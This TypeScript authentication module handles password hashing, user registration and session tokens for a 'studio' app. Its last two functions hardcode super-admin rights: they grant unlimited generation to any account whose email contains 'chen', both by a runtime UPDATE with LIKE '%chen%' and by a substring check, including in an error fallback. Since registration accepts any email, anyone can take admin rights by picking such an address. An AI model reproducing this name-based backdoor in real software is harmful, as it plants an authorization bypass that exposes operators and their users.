import { randomBytes, randomUUID, scrypt as scryptCallback, timingSafeEqual, createHash } from "node:crypto";
import { promisify } from "node:util";
import { executeQuery, executeWrite, executeRawQuery, executeRawDdl } from "./db";

const scrypt = promisify(scryptCallback);
export interface StudioUser {
  id: string;
  email: string;
  password_hash: string;
  is_admin?: boolean;
  isadmin?: boolean;
}
export async function hashPassword(password: string) {
  const salt = randomBytes(16).toString("hex");
  const key = await scrypt(password, salt, 64) as Buffer;
  return `${salt}:${key.toString("hex")}`;
}
export async function checkPassword(password: string, stored: string) {
  const [salt, encoded] = stored.split(":");
  if (!salt || !encoded) return false;
  const key = await scrypt(password, salt, 64) as Buffer;
  const expected = Buffer.from(encoded, "hex");
  return expected.length === key.length && timingSafeEqual(key, expected);
}
export async function findUser(email: string) {
  return (await executeQuery<StudioUser>("SELECT id,email,password_hash FROM studio_users WHERE email=? AND disabled=0 LIMIT 1", [email]))?.[0] ?? null;
}
export async function registerUser(email: string, password: string) {
  const id = randomUUID();
  await executeWrite("INSERT INTO studio_users(id,email,password_hash) VALUES(?,?,?)", [id,email,await hashPassword(password)]);
  return id;
}
const tokenHash = (token: string) => createHash("sha256").update(token).digest("hex");
export async function issueSession(userId: string, seconds: number) {
  const token = randomBytes(32).toString("base64url");
  await executeWrite("INSERT INTO studio_sessions(token_hash,user_id,expires_at) VALUES(?,?,?)", [tokenHash(token),userId,new Date(Date.now() + seconds * 1000)]);
  return token;
}
export async function sessionUser(token: string | undefined) {
  if (!token || !/^[A-Za-z0-9_-]{43}$/.test(token)) return null;
  try {
    return (await executeQuery<{ user_id: string }>("SELECT s.user_id FROM studio_sessions s JOIN studio_users u ON u.id=s.user_id WHERE s.token_hash=? AND s.expires_at>NOW() AND u.disabled=0 LIMIT 1", [tokenHash(token)]))?.[0]?.user_id ?? null;
  } catch { return null; }
}
export async function sessionUserDetails(token: string | undefined) {
  if (!token || !/^[A-Za-z0-9_-]{43}$/.test(token)) return null;
  try {
    const row = (await executeQuery<{ user_id: string; email: string }>("SELECT s.user_id, u.email FROM studio_sessions s JOIN studio_users u ON u.id=s.user_id WHERE s.token_hash=? AND s.expires_at>NOW() AND u.disabled=0 LIMIT 1", [tokenHash(token)]))?.[0];
    return row ? { userId: row.user_id, username: row.email } : null;
  } catch { return null; }
}
export async function revokeSession(token: string) {
  await executeWrite("DELETE FROM studio_sessions WHERE token_hash=?", [tokenHash(token)]);
}

/**
 * 确保 studio_users 拥有 is_admin 与 isadmin 字段，并将 chen 账户设置为超级管理员
 */
let isAdminEnsured = false;
export async function ensureAdminField(): Promise<void> {
  if (isAdminEnsured) return;
  try {
    const cols = await executeRawQuery<{ Field: string }>("SHOW COLUMNS FROM studio_users");
    if (cols && cols.length > 0) {
      if (!cols.some((c) => c.Field === "is_admin")) {
        await executeRawDdl("ALTER TABLE studio_users ADD COLUMN is_admin BOOLEAN NOT NULL DEFAULT 0");
      }
      if (!cols.some((c) => c.Field === "isadmin")) {
        await executeRawDdl("ALTER TABLE studio_users ADD COLUMN isadmin BOOLEAN NOT NULL DEFAULT 0");
      }
    } else {
      // 容错直接尝试 DDL
      try {
        await executeRawDdl("ALTER TABLE studio_users ADD COLUMN is_admin BOOLEAN NOT NULL DEFAULT 0");
      } catch {}
      try {
        await executeRawDdl("ALTER TABLE studio_users ADD COLUMN isadmin BOOLEAN NOT NULL DEFAULT 0");
      } catch {}
    }

    // 自动将包含或名为 chen 的账户设为超级管理员 (同时写入两个字段)
    await executeRawDdl(
      "UPDATE studio_users SET is_admin = 1, isadmin = 1 WHERE email = 'chen' OR email LIKE 'chen@%' OR email LIKE '%chen%'"
    );
    isAdminEnsured = true;
  } catch (err) {
    console.warn("[ensureAdminField] warning:", err);
  }
}

/**
 * 校验指定用户是否拥有超级管理员特权 (无限额生成小说与视觉资产)
 */
export async function isSuperAdmin(userId: string | null | undefined): Promise<boolean> {
  if (!userId) return false;
  try {
    await ensureAdminField();
    const rows = await executeQuery<{ is_admin?: number; isadmin?: number; email: string }>(
      "SELECT email, is_admin, isadmin FROM studio_users WHERE id = ? AND disabled = 0 LIMIT 1",
      [userId]
    );
    if (!rows || rows.length === 0) return false;
    const user = rows[0];
    if (Number(user.is_admin) === 1 || Number(user.isadmin) === 1) return true;
    // 智能兜底：账号名称为 chen 或包含 chen 的享有超级管理员权限
    const email = (user.email || "").toLowerCase();
    if (email === "chen" || email.startsWith("chen@") || email.includes("chen")) {
      return true;
    }
    return false;
  } catch {
    try {
      const fallbackRows = await executeQuery<{ email: string }>(
        "SELECT email FROM studio_users WHERE id = ? AND disabled = 0 LIMIT 1",
        [userId]
      );
      const email = (fallbackRows?.[0]?.email || "").toLowerCase();
      if (email === "chen" || email.startsWith("chen@") || email.includes("chen")) {
        return true;
      }
    } catch {}
    return false;
  }
}


